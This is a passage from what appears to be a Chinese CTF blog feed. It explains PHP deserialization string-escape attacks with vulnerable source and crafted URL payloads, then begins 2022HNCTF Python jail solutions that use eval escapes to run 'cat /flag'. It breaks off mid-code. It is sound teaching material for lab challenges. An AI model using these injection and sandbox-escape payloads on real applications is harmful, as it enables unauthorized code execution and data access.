class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;moe&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$emo</span>);<br><br>&#125;<br><br><span class="hljs-string">&#x27;a.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;moe&#x27;</span>] == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;moe&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>睡前想起来的，这里的session是绕不过的，但是在</p><p>序列化-&gt;反序列化</p><p>这中间，这个<strong>小黑子</strong>进行了如下操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br></code></pre></td></tr></table></figure><p>aiyo是4个字符，ganma是5个字符。</p><p>正常序列化出一个字符串是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>token为最后一个值，既然如此，思路很清晰，构造aiyo，把最后一个token属性挤出去，换上我们构造的token。</p><h3 id="b处构造"><a href="#b处构造" class="headerlink" title="$b处构造"></a>$b处构造</h3><p>构造的token为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>长度为27</p><p>最后要加一个” 把原来的字符串闭合上</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">1</span>&amp;s=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="a处构造"><a href="#a处构造" class="headerlink" title="$a处构造"></a>$a处构造</h3><p>构造的token为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">5</span><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>heizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>长度为43</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo<span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">5</span><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;&amp;s=5</span><br></code></pre></td></tr></table></figure><p>因为这里都是借助</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125; <br></code></pre></td></tr></table></figure><p>所以不能够使用键逃逸，键值不可控，但是其实原理都是一样的，只是要挤兑的值不同。</p><h3 id="本地测试源码"><a href="#本地测试源码" class="headerlink" title="本地测试源码"></a>本地测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-comment">// $emo=&#x27;O:6:&quot;moectf&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:5:&quot;token&quot;;s:5:&quot;baizi&quot;;&#125;&#x27;;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$emo</span>;<br><br>&#125;<br><span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$emo</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$moe</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="魔改baby-unserialize（减）"><a href="#魔改baby-unserialize（减）" class="headerlink" title="魔改baby_unserialize（减）"></a>魔改baby_unserialize（减）</h2><p>上面讲得是替换的字符串增加字符的，现在试试字符串长度减少的，稍微麻烦点，因为需要考虑的细节更多，相对而言 增的逃逸更加粗暴。</p><p>直接在我的测试源码修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-comment">// $emo=&#x27;O:6:&quot;moectf&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:5:&quot;token&quot;;s:5:&quot;baizi&quot;;&#125;&#x27;;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$emo</span>;<br><br>&#125;<br><span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$emo</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$moe</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>现在是把ganma替换为aiyo（没错，我也是小黑子 o(￣ε￣*) </p><p>首先依然放出一个正常的序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>如果把字符串长度增加的replace比作挤兑，字符串长度减小的replace就是修补。把原来的字符串的内容破坏掉，再用自己构造的内容修好。</p><p>字符串长度减小的替换应该更常见一些，经常是替换过滤字符为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>如果构造a处的逃逸则意味着从</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344656.png" alt="image-20221012120057566"></p><p>黄色标注的双引号开始吞噬后面的字符，即从对应的字段值内容开始吞噬。吞噬的意思是，这一部分值都变为变量的内容。既然是吞噬了，那就破坏了原有的序列化字符串的结构，所以需要在后面再构造一个新的内容作为替换，补上破坏的字符串结构。但是这个新内容不能和吞噬部分放在一个变量，新内容加进去多少字符串，变量的长度就加几，无论怎样，新内容始终被包裹在这个变量内。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="1、要保证格式的正确"><a href="#1、要保证格式的正确" class="headerlink" title="1、要保证格式的正确"></a>1、要保证格式的正确</h4><p>比如吞的时候不能只吞一半，导致双引号闭合不上，或者缺少; }等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这意味着，构造时，必须考虑到开始的双引号的闭合，同时还需要考虑到双引号与我们构造的替换payload之间的字段名属性、内容，以及字段内容的属性</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344333.png" alt="image-20221012120721358"></p><p>即图中这一块，去掉以后是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&quot;</span>___<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>heizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这里面$b的内容是我打算用来替换后面的token的payload，所以以$b字段内容的双引号作为闭合。这样后面的payload就不被双引号包裹，逃逸出来了，只需要再构造一个正确的序列化字符串内容就能够被反序列化解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;489&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>前面之所以加入;也是为了保证格式，闭合$a的  ;  被吞掉了，所以需要补上。</p><h4 id="2、吞的时候要保证序列化对象属性个数对的上"><a href="#2、吞的时候要保证序列化对象属性个数对的上" class="headerlink" title="2、吞的时候要保证序列化对象属性个数对的上"></a>2、吞的时候要保证序列化对象属性个数对的上</h4><p>附上一张对象序列化字符串格式</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344451.png" alt="image-20221012115319190"></p><p>更多详细内容可参考<a href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解（Neatstudio.COM）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>比如上述，属性的个数就是3。</p><h3 id="a处构造-1"><a href="#a处构造-1" class="headerlink" title="$a处构造"></a>$a处构造</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=ganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganma&amp;s=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;489&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>ganma的数量为吞噬的属性字符串长度</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344496.png" alt="image-20221012120721358"></p><p>也就是这一段。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344303.png" alt="image-20221012121649328"></p><h3 id="b处构造-1"><a href="#b处构造-1" class="headerlink" title="$b处构造"></a>$b处构造</h3><p>$b应该构造不了吧 ◐▽◑ </p><p>如果从$b开始吞噬，后面没有地方能够放我们的payload了，token不可控。</p><p>可得出使用前提</p><h3 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h3><p>字符串减少的逃逸需要至少两处payload可控，一处用于吞噬字符串，一处用于替换原有的序列化字符串。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>字符串增加的逃逸可理解为把构造的变量值后面的字符挤兑掉，替换为变量值后面的用于替换的payload，需要计算的是<strong>右边双引号到末尾的长度</strong>（和要替换的payload一致）。只需一处即可完成。</p><p>字符串减少的逃逸可理解为序列化字符串的修补过程，先吞噬掉原来的结构，再用替换的payload补上这部分结构，需要计算的是<strong>左边双引号到替换payload的左边双引号长度</strong>，需要构造两处。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解（Neatstudio.COM）</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php反序列化</tag>
      
      <tag>字符逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022HNCTF</title>
    <link href="/2022/10/10/2022HNCTF/"/>
    <url>/2022/10/10/2022HNCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2022HNCTF（自由赛道）"><a href="#2022HNCTF（自由赛道）" class="headerlink" title="2022HNCTF（自由赛道）"></a>2022HNCTF（自由赛道）</h1><p>平台：NSSCTF</p><p>部分题解</p><p>第一次做jail</p><h2 id="Week1-calc-jail-beginner-JAIL"><a href="#Week1-calc-jail-beginner-JAIL" class="headerlink" title="[Week1]calc_jail_beginner(JAIL)"></a>[Week1]calc_jail_beginner(JAIL)</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">It<span class="hljs-comment">&#x27;s an great way to learn an python jail from these challenge! Let&#x27;s play it. Author:crazyman</span><br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Your goal is to read ./flag.txt</span><br><span class="hljs-comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _     ______      _                              _       _ _ </span><br><span class="hljs-string"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="hljs-string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="hljs-string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="hljs-string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="hljs-string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="hljs-string">               __/ |                                           </span><br><span class="hljs-string">              |___/                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>nc连接靶机</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102159399.png" alt="image-20221010203748977"></p><p>无过滤</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>用 <strong>import</strong> 这个内置方法，通过这个方法导入 os 模块，然后再用 os 模块调用 system 方法</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200818.png" alt="image-20221010215123218"></p><h2 id="Week1-python2-input-JAIL"><a href="#Week1-python2-input-JAIL" class="headerlink" title="[Week1]python2 input(JAIL)"></a>[Week1]python2 input(JAIL)</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(&#x27;./flag&#x27;)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200586.png" alt="image-20221003200815680"></p><h2 id="Week1-Challenge-rce"><a href="#Week1-Challenge-rce" class="headerlink" title="[Week1]Challenge__rce"></a>[Week1]Challenge__rce</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 